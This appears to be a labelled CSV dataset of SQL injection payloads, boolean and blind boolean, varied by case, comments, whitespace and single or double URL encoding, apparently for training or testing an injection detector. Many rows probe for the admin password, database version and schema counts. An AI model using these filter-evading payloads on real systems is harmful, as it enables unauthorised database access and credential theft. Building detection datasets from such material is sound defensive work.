id%3D1%27+OR+LENGTH%28%27test%27%29%3D4+%2F%2A,1,sqli_boolean,case_var|comment_block_comment,url_encoded,SQLI_BOOLEAN_001,c68e3dd2be9b8f159197b06c8bb35255,76d80e64969cd4ac3f576baeb6f64591,46
id%253D1%2527%252F%252A%252A%252FOR%252F%252A%252A%252F7%253D7%252F%252A%252A%252F%252523,1,sqli_boolean,comment_url_hash|ws_comment_ws,double_encoded,SQLI_BOOLEAN_001,3dcd86ddcd425f4ed6d7a533e501cc68,6197d3bbf4d98670c6f4b91d597a1bff,89
id=1'+WHERE+1=1+OR+ASCII('A')=65+;--+-,1,sqli_boolean,comment_semicolon_comment|ws_plus,raw,SQLI_BOOLEAN_008,8ae03fcf08785175bdd4b726366f4086,8b152eeb8ef973c294a76b529b738b3d,38
id=1' Where 1=1 oR ASCII('A')=65 ;-- -,1,sqli_boolean,case_var|comment_semicolon_comment,raw,SQLI_BOOLEAN_008,af12112e96bcb0374388501e6f627d7e,acf85650b82079fe1904acbeebe43030,38
username%253Dadmin%2527%2509OR%2509LENGTH%2528%2527test%2527%2529%253D4%2509--%2509-,1,sqli_boolean,comment_dash_dash_space|ws_tab,double_encoded,SQLI_BOOLEAN_003,0752212415ed8205b78217c98dc49b58,9af257b75903d2751c487fb0fa387436,84
id%253D1%2527%2B%2BOr%2B%2BNOT%2B%2B%2528ASCII%2528%2527A%2527%2529%253D65%2529%2B%2B%253B--%2B%2B-,1,sqli_boolean,case_var|comment_semicolon_comment|ws_multi_space,double_encoded,SQLI_BOOLEAN_007,3cbfba41b909968e2554bdb747b09c0b,1a9e3bf144e44351ca27869f4dba8cde,99
id=1%27/*%2A/AND/%2A%2A/LENGTH(%27test')=4%2F%2A%2A%2F--,1,sqli_boolean,comment_dash_dash|ws_comment_ws,partially_encoded,SQLI_BOOLEAN_002,3d87d85cb6431b7e9bcede89f0ac7695,8d5309787219326f0ca70ddeb7666e18,56
id%253D%25271%2527%2BOR%2B%252794%2527%253D%252794%2527%252F%252A,1,sqli_boolean,case_var|comment_block_comment,double_encoded,SQLI_BOOLEAN_005,640cc37d1e593acdd964289be6f1d236,60b0d8d32f56ca53dd1e3cd14def6c2f,65
id%253D1%2527%252Bwhere%252B1%253D1%252BOr%252BASCII%2528%2527A%2527%2529%253D65%252B%2523,1,sqli_boolean,case_var|comment_hash|ws_mixed_ws,double_encoded,SQLI_BOOLEAN_008,9d4ced8936a5bcc8e654974d3857f6d6,d15d603c939f243e6c89fa7d0fadad31,90
id%3D1' OR+1=1 %2F%2A,1,sqli_boolean,comment_block_comment|ws_space,partially_encoded,SQLI_BOOLEAN_001,31aa6de11649907d25071fbc3b87edaf,4e6247f60543012a4ccbcc66bb10e419,21
id%3D1%27+AND+7%3D7+--+-,1,sqli_boolean,case_var|comment_dash_dash_space,url_encoded,SQLI_BOOLEAN_002,e45ed1c6e085f56868319448267d4c7f,1205ba1f691a1b0604bbe34d60c1da1c,24
username%253Dadmin%2527%252520OR%252520%2527a%2527%253D%2527a%2527%252520%252523,1,sqli_boolean,case_var|comment_url_hash|ws_mixed_ws,double_encoded,SQLI_BOOLEAN_003,37f1d2b3f593e78cd095fd55c9f746c0,860ff717075249b6638cf7ca7de37ece,80
id%3D%271%27+or '20'%3D'20%27%23,1,sqli_boolean,case_var|comment_url_hash,partially_encoded,SQLI_BOOLEAN_005,9e0e824cd7b943b2265ce8124e12f047,7899f9e30d549e666230afe0cb44f413,32
id%3D1%27++Or++NOT++%28ASCII%28%27A%27%29%3D65%29++%2523,1,sqli_boolean,case_var|comment_url_hash|ws_multi_space,url_encoded,SQLI_BOOLEAN_007,5db1b131f06d0da66f8dec28dcfc9393,b1b41046d72cfd6ea491cb265bb22772,56
id=%271%27 Or '62'%3D'62%27,1,sqli_boolean,case_var,partially_encoded,SQLI_BOOLEAN_005,af1b5b5acd6594597411e518c820a1ed,8a9087770ee14b177b0324faf7c9c52a,27
id%3D1%27 OR+LENGTH(%27test%27)=4 %23,1,sqli_boolean,case_var|comment_url_hash,partially_encoded,SQLI_BOOLEAN_001,47d0aad60c157a99863d550fb663af0a,9ef805005e6bc046b800e5c921878349,37
id%253D1%2527%2BWHERE%2B1%253D1%2BOR%2B7%253D7%2B%253B--%2B-,1,sqli_boolean,comment_semicolon_comment|ws_space,double_encoded,SQLI_BOOLEAN_008,6fbd5c835df6f2ec153f1c736d60fd42,9ad5b95ff190cc6fd00c373aa1daad1e,60
id%253D1%2527%2509or%2509%25287%253D7%2529%2509--,1,sqli_boolean,case_var|comment_dash_dash|ws_tab,double_encoded,SQLI_BOOLEAN_004,bae6578dbf5150428f40cb3d4ee11642,59e2a4c7ac353686e9009ff014b94b55,49
id=1'+OR+6%3D6+--,1,sqli_boolean,comment_dash_dash|ws_plus,partially_encoded,SQLI_BOOLEAN_006,00867848c14bc1800d83522c921610a2,a4be4b0b76d457f276d2e21d23bd287e,17
id%253D1%2527%252BOR%252B16%253D16%252B%252523,1,sqli_boolean,comment_url_hash|ws_mixed_ws,double_encoded,SQLI_BOOLEAN_006,9be604f8d6c3465a8eb88185f4825708,0621a6abf72b7ef418e288aa37c41b5d,46
id=1'/%2A%2A/Or%2F%2A%2A%2F(ASCII('A')%3D65)%2F%2A%2A/#,1,sqli_boolean,case_var|comment_hash|ws_comment_ws,partially_encoded,SQLI_BOOLEAN_004,0a4d36dd2c2ae80e122b01de35d7fdfa,3710c9029ebb58d95e14073bfb6b56bd,55
id%253D1%2527%2BWHERE%2B1%253D1%2BOR%2B%2527a%2527%253D%2527a%2527%2B%252523,1,sqli_boolean,comment_url_hash,double_encoded,SQLI_BOOLEAN_008,8decb2b5502f4a5f574a88d83ae8ee62,f3a97199ca36f9ad3a0c32d7f7f60f5b,76
username%253Dadmin%2527%2Bor%2BLENGTH%2528%2527test%2527%2529%253D4%2B%2523,1,sqli_boolean,case_var|comment_hash,double_encoded,SQLI_BOOLEAN_003,3c36e193c876e7bd26fc1b39edbad5a8,ec59d13720c8fcb56751cd9c7ad91d71,75
id%253D1%2527%252BOr%252B48%253D48%252B--,1,sqli_boolean,case_var|comment_dash_dash|ws_plus,double_encoded,SQLI_BOOLEAN_006,2096f3b674c31d2b7e6cd8e0ce015f7f,82cd90561f0d5be1988f747e65b8e927,41
id%253D1%2527%2B%2B%2BOR%2B%2B%2B%2528ASCII%2528%2527A%2527%2529%253D65%2529%2B%2B%2B--,1,sqli_boolean,comment_dash_dash|ws_mixed_ws,double_encoded,SQLI_BOOLEAN_004,63fd1eced6cecebf326d727f1e51a786,c28d2d86e963d77c3cbd98500ed97391,87
id%253D1%2527%2BOR%2B%25281%253D1%2529%2B%252523,1,sqli_boolean,comment_url_hash|ws_space,double_encoded,SQLI_BOOLEAN_004,cb959ca7479b32c3379e0c05fe0d5859,b532094a4f4bbb48993580ea013f81fe,48
id%3D1%27+WHERE+1%3D1+Or+ASCII%28%27A%27%29%3D65+--,1,sqli_boolean,case_var|comment_dash_dash,url_encoded,SQLI_BOOLEAN_008,18032327698adaef06af34a7d8409a42,ebdfb42532021d438dc049bc999a7358,51
id=1'+++OR+  44%3D44 ++#,1,sqli_boolean,case_var|comment_hash|ws_mixed_ws,partially_encoded,SQLI_BOOLEAN_006,7e3db125c4d2bc2c3ba591c775f1d736,dba7e8fb0f031c84be755e835899e219,24
id%253D1%2527%2B%2Bor%2B%2B36%253D36%2B%2B%253B--%2B%2B-,1,sqli_boolean,case_var|comment_semicolon_comment|ws_multi_space,double_encoded,SQLI_BOOLEAN_006,7661c52630736ca5453a5e69c1e5299b,0b752d1aa6401e67b4ce1db65a0e6dc1,56
id%3D1%27 OR 100%3C200+%2F%2A,1,sqli_boolean,comment_block_comment,partially_encoded,SQLI_BOOLEAN_001,d88ee25ab5c1cf3525c80be09cf6e1b8,2844c918da615f248f2b1007aad74d3c,29
id=1' Or (CHAR(97)='a') #,1,sqli_boolean,case_var|comment_hash,raw,SQLI_BOOLEAN_004,bf1008612c7293de0e95b2dccc31323b,398680f21672559002c86744535442d0,25
id%253D%25271%2527%252520OR%252520%252788%2527%253D%252788%2527%252F%252A,1,sqli_boolean,comment_block_comment|ws_url_space,double_encoded,SQLI_BOOLEAN_005,ff7e2d7262a6722a4d281765882d6eed,f1b958848051b8842aeabee5075250ee,73
id%3D1%27+AND+CHAR%2897%29%3D%27a%27+%2523,1,sqli_boolean,comment_url_hash,url_encoded,SQLI_BOOLEAN_002,80c14f7140fa05173f98c218ecdde7f2,54b74609e408f86131457a4737590620,42
id%3D1'%20OR%2014%3D14%20--%20-,1,sqli_boolean,comment_dash_dash_space|ws_url_space,partially_encoded,SQLI_BOOLEAN_006,d10ac5dfea083882f5730bb98a9ab2d9,cd7f27c4c6f08578b7229dd35693349f,31
id=1'+where+1=1+Or+2>1+#,1,sqli_boolean,case_var|comment_hash|ws_plus,raw,SQLI_BOOLEAN_008,c0205861be3357b634c2054e8835e3b3,1835ded41c69c8ca7b4a8293be509251,24
id%3D%271%27+++OR+++%2745%27%3D%2745%27%2F%2A,1,sqli_boolean,comment_block_comment|ws_mixed_ws,url_encoded,SQLI_BOOLEAN_005,c8931fb6cedbdc0275e4d8d48aa4898d,4ad177ef09049e841b58d85bd8434f02,45
id%253D1%2527%2BWHERE%2B1%253D1%2BOR%2B1%253D1%2B--%2B-,1,sqli_boolean,comment_dash_dash_space|ws_space,double_encoded,SQLI_BOOLEAN_008,e2f1d85da1dc01ee351dcb4fd0d11704,6eb900c7aad29cd5b93bad50e4f08d99,55
id%253D%25271%2527%252BOR%252B%252756%2527%253D%252756%2527,1,sqli_boolean,ws_mixed_ws,double_encoded,SQLI_BOOLEAN_005,675f0493264debf4c47bb58353c66176,ee49ba602741270066541ea11dd8ee44,59
"id=1'/**/And/**/ORD(MID((SELECT/**/password/**/FROM/**/users/**/whERe/**/user='admin'),45,1))=72/**/#",1,sqli_blind_boolean,case_var|comment_hash|ws_comment_ws,raw,SQLI_BLIND_BOOLEAN_006,58f4a0411e47d85eaaad1ab2c5ea6c3c,a515742b185d24c53c104c666bad1ad6,101
id%3D1%27++AND++%28SELECT++COUNT%28%2A%29++FROM++users%29%3E14++%2523,1,sqli_blind_boolean,case_var|comment_url_hash|ws_multi_space,url_encoded,SQLI_BLIND_BOOLEAN_004,140b4163f309b9ff5dc08bea7905bad9,cff98a3d3e2d36b60bf98159e0b0945a,69
id%3D1%27%2BAnd%2BASCII%28SUBSTRING%28%28SELECT%2Bversion%28%29%29%2C19%2C1%29%29%3D93%2B%2F%2A,1,sqli_blind_boolean,case_var|comment_block_comment|ws_plus,url_encoded,SQLI_BLIND_BOOLEAN_002,229861b4d44d88651ca518ba896697de,bd48b0639f353d2e3bd4a29f6490fb53,95
id%3D1%27%2F%2A%2A%2FAND%2F%2A%2A%2FSUBSTRING%28%28SELECT%2F%2A%2A%2Fdatabase%28%29%29%2C47%2C1%29%3D%27s%27%2F%2A%2A%2F%2523,1,sqli_blind_boolean,comment_url_hash|ws_comment_ws,url_encoded,SQLI_BLIND_BOOLEAN_001,a77458b4465cdbc2a5644038a18ee7a3,440ae05fbdbf84723381985c9a107b2b,125
id%3D1%27++AND++ASCII%28SUBSTRING%28%28SELECT++version%28%29%29%2C46%2C1%29%29%3D122++--,1,sqli_blind_boolean,comment_dash_dash|ws_multi_space,url_encoded,SQLI_BLIND_BOOLEAN_002,f897cfbaf0631ace5bc52c09f3763a71,12fbc0641b8db66843bff0507fbe9b8b,88
"id%3D1%27 AND+SUBSTRING((SELECT+password From users+WHERE+user%3D'admin%27),18,1)%3D'e%27 --",1,sqli_blind_boolean,case_var|comment_dash_dash,partially_encoded,SQLI_BLIND_BOOLEAN_001,54464d20ec94fa1e5fc14c24c2b15962,ae9c8ee1f7ebb5e9f0cb962624092964,92
id=1' and LENGTH((SELECT password FROM users Where user='admin'))=10 --,1,sqli_blind_boolean,case_var|comment_dash_dash|ws_space,raw,SQLI_BLIND_BOOLEAN_003,3c0278a55c57746b465c0d246c636c97,d2ea03a9b837a83e45a391c93a613cc4,71
"id=1%27+AnD MID((SELECT+password+frOm users where user=%27admin%27),40,1)%3D's'+%23",1,sqli_blind_boolean,case_var|comment_url_hash|ws_space,partially_encoded,SQLI_BLIND_BOOLEAN_005,b4415750859c9d4e7006d01bd0620c2b,19fc9a571451623dd9fab4b6bee54e0f,83
id%253D1%2527%2BAND%2BORD%2528MID%2528%2528SELECT%2Bversion%2528%2529%2529%252C41%252C1%2529%2529%253D65%2B--,1,sqli_blind_boolean,case_var|comment_dash_dash,double_encoded,SQLI_BLIND_BOOLEAN_006,3f4818da832373d83626740ef303ed42,2cdedd2b8e9d4a528c1a761e7db53bfc,109
"id=1%27%20AND%20ASCII(SUBSTRING((SELECT%20user()),9,1))%3D76%20%2F*",1,sqli_blind_boolean,case_var|comment_block_comment|ws_url_space,partially_encoded,SQLI_BLIND_BOOLEAN_002,fde83e6e6db18cd3d515aa2581abc897,25cef1a7df3514d48086019eb40d4778,67
"id%3D1'%2F%2A%2A/AND/%2A%2A%2FMID((SELECT%2F**%2Fdatabase()),41,1)=%27s'/*%2A%2F%23",1,sqli_blind_boolean,case_var|comment_url_hash|ws_comment_ws,partially_encoded,SQLI_BLIND_BOOLEAN_005,67462fca1a1ae8d818adbed9e89bfb57,79670705559afcabd77d4778c71d22db,83
id%3D1%27%2Band%2BLENGTH%28%28SELECT%2Bversion%28%29%29%29%3D27%2B%2F%2A,1,sqli_blind_boolean,case_var|comment_block_comment|ws_plus,url_encoded,SQLI_BLIND_BOOLEAN_003,b580db4afeff0a572dc434db1d683ab6,d179edefb830a0c847342215b0219943,72
"id=1' AND SUBSTRING((SELECT version()),37,1)='a' -- -",1,sqli_blind_boolean,case_var|comment_dash_dash_space,raw,SQLI_BLIND_BOOLEAN_001,455a7bddec16b36deed7c262f4241746,c0550652082e9e4e6d5b6664d7d8254c,53
id=1' And LENGTH((SELECT version()))=31 --,1,sqli_blind_boolean,case_var|comment_dash_dash,raw,SQLI_BLIND_BOOLEAN_003,b0deb0980c03f41958e32c6ae89b9e06,6ec4ae7534187e5ec52db41477f4aee1,42
id%253D1%2527%2BAND%2BMID%2528%2528SELECT%2Bpassword%2BFROM%2Busers%2BWHERE%2Buser%253D%2527admin%2527%2529%252C49%252C1%2529%253D%2527a%2527%2B%2523,1,sqli_blind_boolean,comment_hash,double_encoded,SQLI_BLIND_BOOLEAN_005,b2f942c8db207e0f6101239e22de2fc9,1f782359ab4f7442ad094eb312086151,149
"id%3D1%27 AND+ASCII(SUBSTRING((SELECT+version()),2,1))=106 %23",1,sqli_blind_boolean,comment_url_hash,partially_encoded,SQLI_BLIND_BOOLEAN_002,546d596f7bdd2258536ba182321f548d,ab23dba09c7fbcd8db9f801342a5b62e,62
id%3D1%27%2520AND%2520SUBSTRING%28%28SELECT%2520database%28%29%29%2C10%2C1%29%3D%27p%27%2520%2523,1,sqli_blind_boolean,comment_url_hash|ws_url_space,url_encoded,SQLI_BLIND_BOOLEAN_001,98c10e5f3f5d8791b6e1c92f99fe94aa,96e84b2d572ee11597ce478a5d455abe,97
id%253D1%2527%252F%252A%252A%252FanD%252F%252A%252A%252FSUBSTRING%2528%2528SELECT%252F%252A%252A%252Fpassword%252F%252A%252A%252FFROM%252F%252A%252A%252Fusers%252F%252A%252A%252FwHERe%252F%252A%252A%252Fuser%253D%2527admin%2527%2529%252C17%252C1%2529%253D%2527b%2527%252F%252A%252A%252F%252F%252A,1,sqli_blind_boolean,case_var|comment_block_comment|ws_comment_ws,double_encoded,SQLI_BLIND_BOOLEAN_001,08226956c72319b14454c04ba8200a95,1f2b0efc827fd348d5911a0f1f441d56,296
id%3D1%27++and++%28SELECT++COUNT%28%2A%29++frOm++information_schema.columns%29%3E48++--,1,sqli_blind_boolean,case_var|comment_dash_dash|ws_multi_space,url_encoded,SQLI_BLIND_BOOLEAN_004,09fd19dce0dd8f8d12fc987e4fd64c39,fb463adea217f4db47db6a7b63e265c4,87
"id=1'/**/And/**/SUBSTRING((SELECT/**/database()),31,1)='1'/**/#",1,sqli_blind_boolean,case_var|comment_hash|ws_comment_ws,raw,SQLI_BLIND_BOOLEAN_001,675851448228b52d1fa24d3cee51d69f,6c9a44d33a819fcd1fff31313b74ea02,63
"id%3D1%27 +AND +ORD(MID((SELECT+ version()),18,1))%3D91++%23",1,sqli_blind_boolean,comment_hash|ws_multi_space,partially_encoded,SQLI_BLIND_BOOLEAN_006,1fa2384adaa06ce5bbac38897e7a39fa,0dc380a8525ccbed61acb06986d731d8,60
id%3D1%27+AND+%28SELECT+COUNT%28%2A%29+FROM+information_schema.columns%29%3E10+%23,1,sqli_blind_boolean,comment_hash,url_encoded,SQLI_BLIND_BOOLEAN_004,a5ebf94c2314f15800644efafeff81c2,74e1b74bed73a13b25fbb94dd74f5a13,82
"id=1'/**/And/**/SUBSTRING((SELECT/**/user()),50,1)='e'/**/;--/**/-",1,sqli_blind_boolean,case_var|comment_semicolon_comment|ws_comment_ws,raw,SQLI_BLIND_BOOLEAN_001,a1f024196292fdd25ca00a16036b3e7a,9e7788a8b885e0fc368bd469964fce74,66
"id%3D1%27+AND+ORD(MID((SELECT+database()),44,1))=101 --",1,sqli_blind_boolean,case_var|comment_dash_dash,partially_encoded,SQLI_BLIND_BOOLEAN_006,1709d8a10575cf6932de7372465e4284,f9c70b5b1958509b3730bc43908b9026,55
"id=1'%20And%20ORD(MID((SELECT%20version()),7,1))=67%20--",1,sqli_blind_boolean,case_var|comment_dash_dash|ws_url_space,raw,SQLI_BLIND_BOOLEAN_006,216ee98e9b2b13441475a0196ea6d788,a0621f987a6889e57590d53a632007cc,56
id%253D1%2527%252520And%252520SUBSTRING%2528%2528SELECT%252520user%2528%2529%2529%252C42%252C1%2529%253D%2527s%2527%252520%2523,1,sqli_blind_boolean,case_var|comment_hash|ws_url_space,double_encoded,SQLI_BLIND_BOOLEAN_001,1fa8a23593b23773b1088f3637183d58,b8fb831e7d7a703ae093f0596d93a135,127
"id=1' anD MID((SELECT database()),5,1)='c' /*",1,sqli_blind_boolean,case_var|comment_block_comment,raw,SQLI_BLIND_BOOLEAN_005,ff30f01f8bbc209fb39aaec209743498,acad9f489dcd52df7636d03a4dc830e4,45
id%3D1%27+AND+%28SELECT+COUNT%28%2A%29+FROM+users%29%3E38+%2523,1,sqli_blind_boolean,comment_url_hash|ws_space,url_encoded,SQLI_BLIND_BOOLEAN_004,deb3ea9492a0b578d9be34855d7b988c,e6cb9294eb34504943065ef512524b20,63
"id=1'  anD  MID((SELECT  database()),30,1)='c'  --  -",1,sqli_blind_boolean,case_var|comment_dash_dash_space|ws_multi_space,raw,SQLI_BLIND_BOOLEAN_005,0d2a4ef3dc8edbfc801635676905f4c5,51bee8e3ade4d054580ac03df36ea990,53
"id%3D1'+And+ORD(MID((SELECT version()),3,1))%3D76+--+-",1,sqli_blind_boolean,case_var|comment_dash_dash_space,partially_encoded,SQLI_BLIND_BOOLEAN_006,33a6e19ce380438544f01890d3202e0d,f9cfeb7824d7644aa409682cdf573ff6,54
id%3D1%27++and++ORD%28MID%28%28SELECT++database%28%29%29%2C12%2C1%29%29%3D107++%2523,1,sqli_blind_boolean,case_var|comment_url_hash|ws_multi_space,url_encoded,SQLI_BLIND_BOOLEAN_006,d651fe39541710c4dc8fdd959cfea48e,b91f99be43e8ec6f6bf5f9cfd8320a53,84
"id%3D1%27	and	SUBSTRING((SELECT	user()),42,1)%3D%27b%27	--	-",1,sqli_blind_boolean,case_var|comment_dash_dash_space|ws_tab,partially_encoded,SQLI_BLIND_BOOLEAN_001,3c7572405a1abee0a8da1342978b56c7,2d3386ee3154378da13800df63686cc3,60
id%253D1%2527%2509and%2509ASCII%2528SUBSTRING%2528%2528SELECT%2509version%2528%2529%2529%252C16%252C1%2529%2529%253D115%2509--%2509-,1,sqli_blind_boolean,case_var|comment_dash_dash_space|ws_tab,double_encoded,SQLI_BLIND_BOOLEAN_002,210dc6842241c8359b32e9173521d39c,effa2834a9ef41d934867853e0553a2c,132
"id=1' AND MID((SELECT database()),28,1)='1' %23",1,sqli_blind_boolean,case_var|comment_url_hash,raw,SQLI_BLIND_BOOLEAN_005,450c32bc0d6588d0bf6b4cbfa4c50de6,8c1ff4ca3f60951d7e22538be74d83f3,47
"id%3D1' AND MID((SELECT password+from+users+where user%3D%27admin'),46,1)%3D%27admin%27+-- -",1,sqli_blind_boolean,case_var|comment_dash_dash_space|ws_space,partially_encoded,SQLI_BLIND_BOOLEAN_005,be4c56f9e28166a8b263aff7f8be7b99,9c356475ee5ac9440f1c9e58fb2fe198,92
"id=1%27%20And%20ORD(MID((SELECT%20version()),35,1))%3D111%20--%20-",1,sqli_blind_boolean,case_var|comment_dash_dash_space|ws_url_space,partially_encoded,SQLI_BLIND_BOOLEAN_006,0080d08f3752ecbb3c4fb63b76de5278,6f77a5a6497dcf2556ddb84066353aa8,66
id%3D1%27%2Band%2BSUBSTRING%28%28SELECT%2Bdatabase%28%29%29%2C43%2C1%29%3D%27a%27%2B--,1,sqli_blind_boolean,case_var|comment_dash_dash|ws_plus,url_encoded,SQLI_BLIND_BOOLEAN_001,4aa1b298b116f0474edfd0ac7921e1d3,d23caaa9259f1bb2964efb7432a333cb,86
id%253D1%2527%2BAND%2BSUBSTRING%2528%2528SELECT%2Bdatabase%2528%2529%2529%252C44%252C1%2529%253D%25271%2527%2B%252523,1,sqli_blind_boolean,case_var|comment_url_hash|ws_space,double_encoded,SQLI_BLIND_BOOLEAN_001,b178918063810ce08df31a02fea6642b,fd7ba3a9eba49e958290a13106065877,117
id%3D1%27++And++SUBSTRING%28%28SELECT++password++FROM++users++Where++user%3D%27admin%27%29%2C9%2C1%29%3D%27p%27++%2523,1,sqli_blind_boolean,case_var|comment_url_hash|ws_multi_space,url_encoded,SQLI_BLIND_BOOLEAN_001,7526a57f2233f574ffbf80f6e877fa66,ab8f60bf541f8cc098c2c448ee33fda0,118
id%3D1%27+++AND+++LENGTH%28%28SELECT+++password+++from+++users+++WHEre+++user%3D%27admin%27%29%29%3D43+++%2F%2A,1,sqli_blind_boolean,case_var|comment_block_comment|ws_mixed_ws,url_encoded,SQLI_BLIND_BOOLEAN_003,e6aea6cdeb4a29c3871b2374c27a6a57,ceb6df7c5b5921aed07aae9383b369b7,111
id=1' and LENGTH((SELECT password fRom users where user='admin'))=48 ;-- -,1,sqli_blind_boolean,case_var|comment_semicolon_comment,raw,SQLI_BLIND_BOOLEAN_003,1296ebcc319c1aa3a2c367f046721569,6a4952d5901d0118528aa520693d425a,74
id%3D1'+and LENGTH((SELECT+database()))=12+--,1,sqli_blind_boolean,case_var|comment_dash_dash,partially_encoded,SQLI_BLIND_BOOLEAN_003,724ddf1c2f65ed2433ddf6165cfc91c9,78730dc7513011696f0c48b2c94e2a03,45
id%253D1%2527%252BAnd%252BLENGTH%2528%2528SELECT%252Bdatabase%2528%2529%2529%2529%253D4%252B%252F%252A,1,sqli_blind_boolean,case_var|comment_block_comment|ws_plus,double_encoded,SQLI_BLIND_BOOLEAN_003,9175bfa2ad358147d0aaf4b7e7044891,7e15f66aab78a6a32e5be16aaf766ab1,102
id%3D1'	and	LENGTH((SELECT	user()))%3D36	--	-,1,sqli_blind_boolean,case_var|comment_dash_dash_space|ws_tab,partially_encoded,SQLI_BLIND_BOOLEAN_003,bcc98180f181fde38c7ba58e8c760ffa,29aeeb365597d7f92ef35bd9c810d3de,45
id=1'  and  (SELECT  COUNT(*)  fROm  information_schema.columns)>37  %23,1,sqli_blind_boolean,case_var|comment_url_hash|ws_multi_space,raw,SQLI_BLIND_BOOLEAN_004,9704589f999ecdd5d0fcb8c375e4cea2,e378ed8503dd17debf4c8a3c41493e96,72
id%253D1%2527%2BAnd%2BORD%2528MID%2528%2528SELECT%2Bversion%2528%2529%2529%252C30%252C1%2529%2529%253D102%2B%2523,1,sqli_blind_boolean,case_var|comment_hash,double_encoded,SQLI_BLIND_BOOLEAN_006,93fee7ce94f26f92a1b88a1d7495830c,1ce69426bb99fd5c54b2b3a1710509b8,113
id%253D1%2527%252BAnd%252BLENGTH%2528%2528SELECT%252Bversion%2528%2529%2529%2529%253D35%252B%252523,1,sqli_blind_boolean,case_var|comment_url_hash|ws_mixed_ws,double_encoded,SQLI_BLIND_BOOLEAN_003,173a75b66c8ad734245564fc06796f17,6cc41550e309ac3aab8433d62667fc19,99
"id%3D1%27%20AND%20ORD(MID((SELECT%20password%20From%20users%20WHere%20user=%27admin'),1,1))=66%20;--%20-",1,sqli_blind_boolean,case_var|comment_semicolon_comment|ws_url_space,partially_encoded,SQLI_BLIND_BOOLEAN_006,513bbdf6f61c39b3d40bfb268d781784,f566114c7738784e01e2f08ee9655bec,104
"id=1%27+AND SUBSTRING((SELECT+version()),30,1)%3D%27s%27 %23",1,sqli_blind_boolean,comment_hash,partially_encoded,SQLI_BLIND_BOOLEAN_001,83c933a64801c65372ea8ac67688e386,7b18d594189b1cb641f190a3e890c8ec,60
id%253D1%2527%2BAND%2B%2528SELECT%2BCOUNT%2528%252A%2529%2BFrom%2Busers%2529%253E42%2B--,1,sqli_blind_boolean,case_var|comment_dash_dash,double_encoded,SQLI_BLIND_BOOLEAN_004,e44f058588cb1f9f5be80fcafef03c48,615d51d16d3ecac30d06a83fa363807c,88
id%3D1'%20AND%20(SELECT%20COUNT(%2A)%20From%20information_schema.columns)>24%20%23,1,sqli_blind_boolean,case_var|comment_url_hash|ws_url_space,partially_encoded,SQLI_BLIND_BOOLEAN_004,01d41088b905e773715acbdfe933c785,1cdaa79a979e9888c1972604e6698c97,82
id%253D1%2527%252520aNd%252520LENGTH%2528%2528SELECT%252520database%2528%2529%2529%2529%253D22%252520%252F%252A,1,sqli_blind_boolean,case_var|comment_block_comment|ws_url_space,double_encoded,SQLI_BLIND_BOOLEAN_003,8161fbc2d1f7875ba2259c3078eb9149,9ba952f57351348dab29dfc54ac5fed4,111
id%3D1%27%2BAND%2BMID%28%28SELECT%2Bdatabase%28%29%29%2C11%2C1%29%3D%27admin%27%2B%2523,1,sqli_blind_boolean,case_var|comment_url_hash|ws_plus,url_encoded,SQLI_BLIND_BOOLEAN_005,d9c95918cdc2a0e371f55b694c3dc9ed,e774d62def6fac1517d8d3a3e2618b31,87
"id=1' And ORD(MID((SELECT version()),39,1))=95 -- -",1,sqli_blind_boolean,case_var|comment_dash_dash_space,raw,SQLI_BLIND_BOOLEAN_006,609fa351355b6fac7f37886e4ee2676e,6a2d36ae9b760a9de8446f19d30b5fe5,51
id=1' AND (SELECT COUNT(*) FROM users)>28 --,1,sqli_blind_boolean,comment_dash_dash,raw,SQLI_BLIND_BOOLEAN_004,375d5adc8ce28e05a34dbcb3a8b46a7f,f7e91862ce84c52ae53f6ed5a14c69d3,44
id%253D1%2527%2B%2BAND%2B%2BLENGTH%2528%2528SELECT%2B%2Bdatabase%2528%2529%2529%2529%253D4%2B%2B%253B--%2B%2B-,1,sqli_blind_boolean,comment_semicolon_comment|ws_multi_space,double_encoded,SQLI_BLIND_BOOLEAN_003,fa30efa62e7b62ebc8994c85c1f2c7d8,01947588194b18c901f996b44c05148f,110
id%3D1%27%2F%2A%2A%2FAnd%2F%2A%2A%2FLENGTH%28%28SELECT%2F%2A%2A%2Fversion%28%29%29%29%3D50%2F%2A%2A%2F%2F%2A,1,sqli_blind_boolean,case_var|comment_block_comment|ws_comment_ws,url_encoded,SQLI_BLIND_BOOLEAN_003,e2716b9c5016c653312c3c9110722dc5,dbb4b8ba21d0b408da52fb721a18ba79,108
id%3D1%27+++and+++MID%28%28SELECT+++database%28%29%29%2C7%2C1%29%3D%271%27+++--,1,sqli_blind_boolean,case_var|comment_dash_dash|ws_mixed_ws,url_encoded,SQLI_BLIND_BOOLEAN_005,dff453196d3c83487ecd148ab734dd51,8b691782d659ed9150c711c10ea4a2e1,79
id%3D1%27%2520And%2520ASCII%28SUBSTRING%28%28SELECT%2520user%28%29%29%2C38%2C1%29%29%3D106%2520--%2520-,1,sqli_blind_boolean,case_var|comment_dash_dash_space|ws_url_space,url_encoded,SQLI_BLIND_BOOLEAN_002,65638edc7ef95d3b6bb0b4f320b47cae,e1ae470904594e301d259e86b314c64f,103
id%3D1%27+and+(SELECT+COUNT(*)+frOm+information_schema.columns)%3E48+--+-,1,sqli_blind_boolean,case_var|comment_dash_dash_space|ws_plus,partially_encoded,SQLI_BLIND_BOOLEAN_004,d25171684fa41deddf16b4961f287b8b,985d09335e81a003d0020a6f50596579,73
id%3D1%27+And+ORD%28MID%28%28SELECT+version%28%29%29%2C11%2C1%29%29%3D116+%2523,1,sqli_blind_boolean,case_var|comment_url_hash,url_encoded,SQLI_BLIND_BOOLEAN_006,8750f22823449c2d1db10faa1e844e56,7b457c10fd4a4d8410e8c748e21b2a99,79
"id=1' AND MID((SELECT database()),48,1)='admin' #",1,sqli_blind_boolean,comment_hash,raw,SQLI_BLIND_BOOLEAN_005,c93672554c2f71200abc9f096389fe36,592547fc9c61d9b3d6bd0f6539da845f,49
id=1' And (SELECT COUNT(*) froM information_schema.tables)>45 #,1,sqli_blind_boolean,case_var|comment_hash,raw,SQLI_BLIND_BOOLEAN_004,d9cfcbcf53ab6493ddcd2dd468021519,db643f230e7c82a8c3c4976489d357a9,63
id%253D1%2527%2B%2Band%2B%2BORD%2528MID%2528%2528SELECT%2B%2Bpassword%2B%2BfrOm%2B%2Busers%2B%2BWHErE%2B%2Buser%253D%2527admin%2527%2529%252C26%252C1%2529%2529%253D88%2B%2B%253B--%2B%2B-,1,sqli_blind_boolean,case_var|comment_semicolon_comment|ws_multi_space,double_encoded,SQLI_BLIND_BOOLEAN_006,b1b823d7631a55966cafd98b2da264ad,5bcacf9494fdfdc635b8a8a70c8487c7,186
